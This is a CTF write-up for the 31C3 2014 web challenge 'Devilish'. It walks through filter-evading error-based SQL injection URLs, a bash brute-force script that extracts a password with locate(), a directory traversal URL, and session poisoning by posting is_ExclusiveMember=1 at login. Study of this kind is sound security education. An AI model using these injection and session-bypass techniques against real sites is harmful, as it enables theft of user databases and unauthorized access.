# 31C3 CTF 2014: Devilish

**Category:** web
**Points:** 30
**Solves:** 24
**Description:**

> It’s some devilish community public portal, we’re pretty sure there’s something else out there, a private portal maby, we’d like to know the secret behind it.
> <http://188.40.18.70/>

## Write-up

31c3ctf devilish writeup by boogy
#################################

This is my first ctf writeup so I hope it won't be to horrible. And sorry in advance for my bad English.

I'll talk about devilish a web challenge from the [31c3ctf 2014 CTF](https://31c3ctf.aachen.ccc.de/). I'll give credit to one of our team members on this one "Michael", because we were both working on this challenge.

Well lets get to business with the devilish 30 points challenge. Only 24 teams solved it.

Here is the description of the challenge:

>It's some devilish community public portal, we're pretty sure there's something else out there, a private portal maby, we'd like to know the secret behind it

When we go to the web page we can see a nice vampire-sh web page :

![alt text](http://3.bp.blogspot.com/-1nyChnZx-Bg/VKLGMAeyXyI/AAAAAAAACPg/X2bDekG9wiY/s1600/Capture%2Bd%E2%80%99e%CC%81cran%2B2014-12-30%2Ba%CC%80%2B16.34.40.png "INDEX PAGE")

```bash
http://188.40.18.70/PROFILE/55\/||extractvalue(3,concat(0x3a,(select%0bconcat_ws(0x3a3a,id_user,Us3rN4m3)%0bfrom%0busers%0blimit%0b0,1)))--%0b
```

After some research we can see that there is a sql injection vulnerability in the PROFILE page. The problem is that the font used by the web page is with Halloween images and you need to show the HTML source all the time to see the error message from the sql injection. So one of our team members Michael had the idea to disable firefox **gfx.downloadable_fonts.enabled** option. So juste set the option to false.

![alt text](http://3.bp.blogspot.com/-ltBPEwqf0Eg/VKLIen_kVQI/AAAAAAAACP4/B5xU9YFXGmk/s1600/Capture%2Bd%E2%80%99e%CC%81cran%2B2014-12-30%2Ba%CC%80%2B16.44.41.png "sql 1")

```bash
http://188.40.18.70/PROFILE/55\/||extractvalue(3,concat(0x3a,(select%0bconcat_ws(0x3a3a,id_user,Us3rN4m3)%0bfrom%0busers%0blimit%0b0,1)))--%0b
```

Above you have the page before changing the **gfx.downloadable_fonts.enabled** which is set to true and here it is after:

![alt text](http://2.bp.blogspot.com/-XCab5VxZxa0/VKLK30OUl2I/AAAAAAAACQE/BYt0SwFb8_c/s1600/Capture%2Bd%E2%80%99e%CC%81cran%2B2014-12-30%2Ba%CC%80%2B16.43.57.png "sql 2")


Better isn't it ?

OK, so now we know where the injection is and we can run commands. But there are a lot of filters that don't allow us to enumerate columns. information_schema, table, or, union all of these are filtered, so we need to find a way around it. What we need is the password column name to be able to login.

To enumerate the columns without the above keywords we can do error based sql injection with duplicate keys error. This will enumerate the columns for us. So the final exploit for the sql column problem is :

```bash
http://188.40.18.70/PROFILE/55%5C/||extractvalue%28null,concat%280x3a,%28select%09*%09from%28select%09*%09from%09users%09as%09a%09join%09users%09as%09b%09using%28id_user,Us3rN4m3,Em4iL4dR3Szz,S4cR3dT3xT0Fm3,MyPh0N3NumB3RHAHA,Addr3Zz0F_tHi5_D3wD,CHAR_LOL%29%29as%09x%29%29%29--%0B
```

Witch gives us :

![alt text](http://1.bp.blogspot.com/-4-V1FwNX7Jc/VKLIKgPRgmI/AAAAAAAACPw/VfgpFuQTD2I/s1600/Capture%2Bd%E2%80%99e%CC%81cran%2B2014-12-30%2Ba%CC%80%2B16.43.21.png "sql 3")

This is the column we need to extract the password from. So let's do that:

![alt text](http://4.bp.blogspot.com/-WWEQnKReXPM/VKL3xoRWMYI/AAAAAAAACQ4/K5kp82bQHbY/s1600/Capture%2Bd%E2%80%99e%CC%81cran%2B2014-12-30%2Ba%CC%80%2B20.06.26.png "sql 4")

```bash
http://188.40.18.70/PROFILE/55%5C/||extractvalue%283,concat%280x7e,%28select%09concat_ws%280x3a,Us3rN4m3,P4sWW0rD_0F_M3_WTF%29%09from%09users%09limit%091,1%29%29%29--%09
```

But when we try to log in with the password it doesn't work. So may be the error does not show all the chars from the password. We need to bruteforce the reste of the password with locate(). Here is a script that Michael made really fast:

```bash
#!/bin/bash
str='ZD456ddssd65456lksndoiNzd654sdsd'
while true
do
a=0;
echo "New string: $str"
        for i in {a..z}; do
        wget --quiet -O $i 'http://188.40.18.70/PROFILE/55%5C/||extractvalue%283,concat%280x3a,%28select%0Blocate("'$str$i'",P4sWW0rD_0F_M3_WTF)%0Bfrom%0Busers%0Blimit%0B1,1%29%29%29--%0B'
        if grep ":1" $i; then
                str=$str$i
a=1
        echo "$str";
        fi
        done
if [ $a==1 ]; then
        for i in {0..9}; do
        wget --quiet -O $i 'http://188.40.18.70/PROFILE/55%5C/||extractvalue%283,concat%280x3a,%28select%0Blocate("'$str$i'",P4sWW0rD_0F_M3_WTF)%0Bfrom%0Busers%0Blimit%0B1,1%29%29%29--%0B'
        if grep ":1" $i; then
                str=$str$i
a=1
        echo "$str";
        fi
        done
fi
if [ $a -eq 0 ]; then
        echo "PWD:$str"
        exit;
fi
done
```

Which gives us Dracula's account password:

>
Username: Dracula
Password: ZD456ddssd65456lksndoiNzd654sdsd654zd65s4d56489zdz

After logging in, we found easily a directory traversal vulnerability that lets us understand that there is another site on the server as said in the challenge description. This source-code is different from the original site in **/var/www/html**:

>http://188.40.18.70/ACCESS?action=browse&dir=../../../../../home/devilish.local

![alt text](http://1.bp.blogspot.com/-rmKkeBl3bDY/VKLQtwUX76I/AAAAAAAACQU/o3PtyleFbJI/s1600/Capture%2Bd%E2%80%99e%CC%81cran%2B2014-12-30%2Ba%CC%80%2B17.10.09.png "sql 5")

We can also see the code source of some pages that gives us a precious information for the next step:
http://188.40.18.70/__WebSiteFuckingPrivateContentNotForPublic666/LOGIN_HEAD
show us the following code:

```php
<?php
 if(@$_SESSION['user']){header("location: ".$LINK);die();}
 if(isset($_POST['user'])){
  if(mysqli_num_rows(mysqli_query($con,"SELECT * FROM users WHERE Us3rN4m3='".mysqli_real_escape_string($con,@$_POST['user'])."' AND P4sWW0rD_0F_M3_WTF='".mysqli_real_escape_string($con,@$_POST['pass'])."' "))>0){
   $_SESSION=$_POST;
   header("location: ".$LINK);die();
  }else{
   $Error=1;
  }
 }
?> 
```

An here is the LOGIN_HEAD from devilish.local:

```php
<?php
        if(@$_SESSION['is_ExclusiveMember']){header("location: ".$LINK);die();}
        if(isset($_POST['user'])){
                if(@$_POST['user']===$uLOGIN && @$_POST['pass']===$uPASSWORD){
                        $_SESSION['is_ExclusiveMember']=1;
                        header("location: ".$LINK);
                        die();
                }else{
                        $Error=1;
                }
        }
?>
```

So we need to access the second web page but how. Well you have 2 options. One you use curl and modify the Host parameter or you modify your /etc/hosts and add:

```bash
188.40.18.70    devilish.local
```

We used the second one, its more nice to do it with the web browser :). But when we go to the devilish.local web page there is no login option. And we can see this on the INDEX page:

```php
<?php echo($logged?"Here's your secret ".$flag."":"Login to access the secret")?>
```

So may be the 2 webpages use the same session. So we go back to the first site and log in but this time we send the parameter is_ExclusiveMember=1 in the post request. Remember the code above that showed us:

```php
$_SESSION=$_POST;
```

So we use firefox's [Firefox Hackbar](https://addons.mozilla.org/fr/firefox/addon/hackbar/) and send this:

>url : http://188.40.18.70/LOGIN
post: is_ExclusiveMember=1&pass=ZD456ddssd65456lksndoiNzd654sdsd654zd65s4d56489zdz&user=Dracula

Once logged in on the first website, we go again on the second one and we can see this on the first page :

![alt text](http://2.bp.blogspot.com/-T4613cgBHaI/VKLTtRc2NBI/AAAAAAAACQg/SWV4WHklcmQ/s1600/Capture%2Bd%E2%80%99e%CC%81cran%2B2014-12-30%2Ba%CC%80%2B17.11.56.png "flag")

So the flag is :
>31c3_Th3r3_4R3_D3v1li5h_Th0ght5_ev3N_1N_th3_M0sT_4ng3l1c_M1nd5

## Other write-ups and resources

* <http://0xboogy.blogspot.com/2014/12/31c3ctf-devilish-writeup.html>
* <http://l4w.io/2014/12/31c3-ctf-writeups/>
* <http://kitctf.de/writeups/31c3-ctf/devilish/>
